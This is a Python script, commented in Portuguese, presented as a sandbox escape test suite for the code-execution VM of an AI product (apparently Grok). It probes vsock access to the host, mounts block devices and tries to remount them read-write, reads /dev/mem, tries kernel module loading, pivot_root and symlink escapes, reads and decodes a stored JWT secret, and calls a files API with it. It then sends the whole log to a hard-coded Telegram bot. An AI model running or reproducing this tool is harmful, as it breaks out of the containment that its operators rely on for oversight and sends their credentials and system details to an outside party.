#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Sandbox Escape Test Suite for Hades VM (xAI/Grok)
Executa uma bateria de testes de escape e envia o relatório para o Telegram.
"""

import os
import sys
import subprocess
import time
import json
import hashlib
import socket
import requests
from datetime import datetime, timezone
from pathlib import Path

# ========= CONFIGURAÇÃO DO TELEGRAM =========
BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
CHAT_ID = "230885588"
# =============================================

# Diretório temporário para logs
LOG_FILE = "/tmp/escape_test_log.txt"

# Lista para armazenar linhas do log
log_lines = []

def add_log(s=""):
    """Adiciona uma linha ao log e imprime no console."""
    log_lines.append(s)
    print(s)

def sh(cmd, timeout=15):
    """Executa um comando shell e retorna a saída (stderr mesclado)."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return f"(TIMEOUT após {timeout}s) comando: {cmd}"
    except Exception as e:
        return f"(ERRO ao executar: {e})"

def file_read(path):
    """Lê o conteúdo de um arquivo, se existir."""
    try:
        with open(path, 'r') as f:
            return f.read()
    except Exception:
        return None

# ============================================================
# 1. RECONHECIMENTO DO AMBIENTE
# ============================================================
def section_identity():
    add_log("\n" + "="*72)
    add_log("1. IDENTIDADE DO AMBIENTE")
    add_log("="*72)
    add_log(f"hostname: {socket.gethostname()}")
    add_log(f"uname: {sh('uname -a').strip()}")
    add_log(f"kernel cmdline: {sh('cat /proc/cmdline').strip()[:500]}")
    add_log("Tipo: VM Hades (xAI/Grok) sobre Cloud Hypervisor")
    add_log("Init: catatonit → xai-hades-charon (init + serve-ch-vsock)")

# ============================================================
# 2. PRIVILÉGIOS E CAPABILITIES
# ============================================================
def section_privileges():
    add_log("\n" + "="*72)
    add_log("2. PRIVILÉGIOS E CAPACITIES")
    add_log("="*72)
    add_log(sh("id").strip())
    add_log("Capabilities (self):")
    add_log(sh("grep Cap /proc/self/status").strip())
    add_log("Capabilities (PID1):")
    add_log(sh("grep Cap /proc/1/status").strip())
    add_log("NoNewPrivs self: " + sh("grep NoNewPrivs /proc/self/status").strip())
    add_log("NoNewPrivs PID1: " + sh("grep NoNewPrivs /proc/1/status").strip())
    add_log("Seccomp: " + sh("grep -i seccomp /proc/self/status").strip())
    # Verifica se é root
    if os.geteuid() == 0:
        add_log("✅ Executando como root (UID 0)")
    else:
        add_log("⚠️  Não é root - alguns testes podem falhar")

# ============================================================
# 3. DISPOSITIVOS E FILESYSTEMS
# ============================================================
def section_devices():
    add_log("\n" + "="*72)
    add_log("3. DISPOSITIVOS E FILESYSTEMS")
    add_log("="*72)
    add_log("lsblk:")
    add_log(sh("lsblk").strip())
    add_log("\nDispositivos especiais:")
    add_log(sh("ls -la /dev/ | grep -E 'mem|kmem|port|kmsg|vsock|vda|vdb|vdc|vdd'").strip())
    add_log("\nMontagens:")
    add_log(sh("cat /proc/mounts").strip())

# ============================================================
# 4. TESTES DE ESCAPE - VSOCK
# ============================================================
def section_vsock():
    add_log("\n" + "="*72)
    add_log("4. TESTE VSOCK (COMUNICAÇÃO COM HOST)")
    add_log("="*72)
    if os.path.exists("/dev/vsock"):
        add_log("/dev/vsock presente")
        # Tenta conectar ao CID 2 (host) em portas comuns
        for cid in [2, 3, 4]:
            for port in [22, 4242, 8080, 443, 80]:
                try:
                    s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((cid, port))
                    add_log(f"✅ CONEXÃO BEM-SUCEDIDA para CID {cid} porta {port}")
                    s.close()
                except Exception as e:
                    pass
        # Tenta enviar dados arbitrários para o serviço charon (porta 4242)
        try:
            s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((2, 4242))
            s.send(b"\x00"*1024)  # payload malicioso
            resp = s.recv(1024)
            add_log(f"Resposta do vsock (CID2:4242): {resp[:200]}")
            s.close()
        except Exception as e:
            add_log(f"Falha ao comunicar com vsock: {e}")
    else:
        add_log("/dev/vsock NÃO encontrado")

# ============================================================
# 5. TESTE DE MONTAGEM DE DISPOSITIVOS DE BLOCO
# ============================================================
def section_block_mount():
    add_log("\n" + "="*72)
    add_log("5. TESTE DE MONTAGEM DE DISPOSITIVOS ADICIONAIS")
    add_log("="*72)
    # /dev/vdc é um volume de ~16GB RO - tenta montar
    for dev in ["/dev/vdc", "/dev/vdb"]:
        mnt = f"/tmp/mnt_{dev.replace('/','_')}"
        os.makedirs(mnt, exist_ok=True)
        cmd = f"mount -t auto {dev} {mnt} 2>&1"
        out = sh(cmd)
        if "mount" in out and "permission" not in out.lower():
            add_log(f"✅ Montagem de {dev} bem-sucedida em {mnt}")
            # Lista conteúdo
            add_log(f"Conteúdo de {mnt}:")
            add_log(sh(f"ls -la {mnt} | head -20").strip())
            # Tenta remontar como RW
            add_log(f"Tentando remontar {dev} como RW:")
            add_log(sh(f"mount -o remount,rw {dev} 2>&1").strip())
            # Desmonta
            sh(f"umount {mnt}")
        else:
            add_log(f"❌ Falha ao montar {dev}: {out[:200]}")

# ============================================================
# 6. TESTE DE /dev/mem E /dev/kmem
# ============================================================
def section_dev_mem():
    add_log("\n" + "="*72)
    add_log("6. TESTE DE ACESSO A /dev/mem E /dev/kmem")
    add_log("="*72)
    for f in ["/dev/mem", "/dev/kmem"]:
        if os.path.exists(f):
            try:
                # Tenta ler os primeiros 1KB
                with open(f, 'rb') as fd:
                    data = fd.read(1024)
                add_log(f"✅ Leitura de {f} bem-sucedida (primeiros 1024 bytes)")
                # Busca strings legíveis
                strings = data.decode('latin-1', errors='ignore').strip()
                add_log(f"Strings encontradas: {strings[:200]}")
            except Exception as e:
                add_log(f"❌ Erro ao ler {f}: {e}")
        else:
            add_log(f"{f} não existe")

# ============================================================
# 7. TESTE DE CARREGAMENTO DE MÓDULO (CAP_SYS_MODULE)
# ============================================================
def section_module_loading():
    add_log("\n" + "="*72)
    add_log("7. TESTE DE CARREGAMENTO DE MÓDULO KERNEL")
    add_log("="*72)
    # Verifica se módulos podem ser carregados
    disabled = file_read("/proc/sys/kernel/modules_disabled")
    if disabled and "0" in disabled:
        add_log("✅ Módulos habilitados (modules_disabled=0)")
        # Tenta carregar um módulo nulo (se tiver compilador)
        if sh("which gcc").strip():
            add_log("gcc encontrado, compilando módulo dummy")
            code = """
#include <linux/module.h>
#include <linux/kernel.h>
static int __init init(void) { printk(KERN_INFO "ESCAPE_MODULE_LOADED\\n"); return 0; }
static void __exit exit(void) { printk(KERN_INFO "ESCAPE_MODULE_UNLOADED\\n"); }
module_init(init);
module_exit(exit);
MODULE_LICENSE("GPL");
"""
            with open("/tmp/dummy.c", "w") as f:
                f.write(code)
            sh("cd /tmp && gcc -c dummy.c -o dummy.o 2>&1")
            if os.path.exists("/tmp/dummy.o"):
                out = sh("insmod /tmp/dummy.o 2>&1")
                if "Error" not in out:
                    add_log("✅ Módulo carregado com sucesso!")
                    add_log(sh("lsmod | grep dummy").strip())
                    # Descarrega
                    sh("rmmod dummy 2>&1")
                else:
                    add_log(f"❌ Falha ao carregar módulo: {out}")
            else:
                add_log("Falha na compilação do módulo")
        else:
            add_log("gcc não encontrado, não é possível compilar módulo")
    else:
        add_log("❌ Módulos desabilitados (modules_disabled != 0)")

# ============================================================
# 8. TESTE DE PIVOT_ROOT E OVERLAY
# ============================================================
def section_pivot_root():
    add_log("\n" + "="*72)
    add_log("8. TESTE DE PIVOT_ROOT / ESCAPE DO OVERLAY")
    add_log("="*72)
    try:
        os.makedirs("/tmp/newroot", exist_ok=True)
        os.makedirs("/tmp/oldroot", exist_ok=True)
        # Tentar pivot_root
        out = sh("pivot_root /tmp/newroot /tmp/oldroot 2>&1")
        if "pivot_root" in out and "success" not in out:
            # Se falhar, tenta com mount --move
            add_log(f"pivot_root falhou: {out[:200]}")
            # Alternativa: mount --move
            add_log("Tentando mount --move / /tmp/newroot")
            out2 = sh("mount --move / /tmp/newroot 2>&1")
            add_log(out2[:200])
        else:
            add_log("✅ pivot_root parece ter funcionado (cuidado!)")
            add_log("Listando /tmp/oldroot para ver conteúdo original:")
            add_log(sh("ls -la /tmp/oldroot | head -20").strip())
    except Exception as e:
        add_log(f"Erro no teste pivot_root: {e}")

# ============================================================
# 9. TESTE DE FUSE GROK-FILES
# ============================================================
def section_grok_fuse():
    add_log("\n" + "="*72)
    add_log("9. TESTE DE FUSE GROK-FILES")
    add_log("="*72)
    # Verificar se o fuse está montado
    out = sh("mount | grep grok-files").strip()
    add_log(f"Mount grok-files: {out}")
    # Tentar acessar fora do diretório via links simbólicos
    if os.path.isdir("/home/workdir/artifacts"):
        add_log("Tentando criar links simbólicos para escape")
        try:
            os.symlink("/etc/passwd", "/home/workdir/artifacts/passwd_link")
            add_log("Link criado, tentando ler via FUSE:")
            add_log(sh("cat /home/workdir/artifacts/passwd_link 2>&1").strip()[:200])
            os.unlink("/home/workdir/artifacts/passwd_link")
        except Exception as e:
            add_log(f"Falha ao criar link: {e}")

# ============================================================
# 10. TESTE DE PROCESSOS E CAPS
# ============================================================
def section_processes():
    add_log("\n" + "="*72)
    add_log("10. PROCESSOS RELEVANTES")
    add_log("="*72)
    add_log(sh("ps aux --sort=-%mem | head -20").strip())

# ============================================================
# 11. TESTE DE NAMESPACES
# ============================================================
def section_namespaces():
    add_log("\n" + "="*72)
    add_log("11. NAMESPACES")
    add_log("="*72)
    add_log(sh("ls -la /proc/self/ns/").strip())
    add_log("\nNamespaces do PID1:")
    add_log(sh("readlink /proc/1/ns/* 2>/dev/null").strip())

# ============================================================
# 12. TESTE DE JWT E SECRETS
# ============================================================
def section_jwt():
    add_log("\n" + "="*72)
    add_log("12. JWT E SECRETS")
    add_log("="*72)
    jwt_path = "/etc/secrets/terminal.jwt"
    if os.path.exists(jwt_path):
        jwt = file_read(jwt_path)
        if jwt:
            add_log(f"JWT lido de {jwt_path} (tamanho {len(jwt)})")
            # Verificar claims
            try:
                parts = jwt.split(".")
                if len(parts) >= 2:
                    # Decodificar cabeçalho e payload
                    import base64
                    def b64pad(s):
                        return s + "=" * (-len(s) % 4)
                    header = json.loads(base64.urlsafe_b64decode(b64pad(parts[0])))
                    payload = json.loads(base64.urlsafe_b64decode(b64pad(parts[1])))
                    add_log(f"Header: {header}")
                    add_log("Claims:")
                    for k, v in payload.items():
                        add_log(f"  {k}: {v}")
            except Exception as e:
                add_log(f"Erro ao decodificar JWT: {e}")
    else:
        add_log("JWT não encontrado")

# ============================================================
# 13. TESTE DE REQUEST PARA FILES.GROK.COM (exfiltração)
# ============================================================
def section_files_api():
    add_log("\n" + "="*72)
    add_log("13. TESTE DE ACESSO À API FILES.GROK.COM")
    add_log("="*72)
    # Tenta listar diretórios com o JWT
    jwt = os.environ.get("TERMINAL_JWT_VAL") or file_read("/etc/secrets/terminal.jwt")
    if jwt:
        headers = {"Authorization": f"Bearer {jwt}"}
        try:
            resp = requests.get("https://files.grok.com/api/v1/list", headers=headers, timeout=5)
            add_log(f"Resposta da API: status {resp.status_code}")
            add_log(f"Primeiros 200 caracteres: {resp.text[:200]}")
        except Exception as e:
            add_log(f"Falha ao acessar API: {e}")
    else:
        add_log("Sem JWT disponível")

# ============================================================
# FUNÇÃO PRINCIPAL: EXECUTA TODOS OS TESTES E ENVIA LOG
# ============================================================
def main():
    add_log("="*72)
    add_log("INÍCIO DO RELATÓRIO DE TESTES DE ESCAPE")
    add_log(f"Data/Hora: {datetime.now(timezone.utc).isoformat()}")
    add_log("="*72)

    # Executa todas as seções
    section_identity()
    section_privileges()
    section_devices()
    section_vsock()
    section_block_mount()
    section_dev_mem()
    section_module_loading()
    section_pivot_root()
    section_grok_fuse()
    section_processes()
    section_namespaces()
    section_jwt()
    section_files_api()

    # Rodapé
    add_log("\n" + "="*72)
    add_log("FIM DO RELATÓRIO")
    add_log("="*72)

    # Escreve arquivo de log
    full_log = "\n".join(log_lines)
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write(full_log)

    print(f"\nLog salvo em {LOG_FILE}")

    # Envia para o Telegram
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        files = {'document': (LOG_FILE, open(LOG_FILE, 'rb'), 'text/plain')}
        data = {'chat_id': CHAT_ID, 'caption': f'Escape Test Report - {datetime.now().isoformat()}'}
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            print("✅ Arquivo enviado com sucesso para o Telegram!")
        else:
            print(f"❌ Falha ao enviar: {response.status_code} - {response.text}")
            # Fallback: enviar como mensagem de texto
            url_text = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {'chat_id': CHAT_ID, 'text': full_log[:4000]}  # limite de 4096
            resp = requests.post(url_text, json=payload)
            if resp.status_code == 200:
                print("✅ Log enviado como mensagem de texto (fallback)")
            else:
                print(f"❌ Fallback também falhou: {resp.text}")
    except Exception as e:
        print(f"Erro ao enviar para Telegram: {e}")

if __name__ == "__main__":
    main()
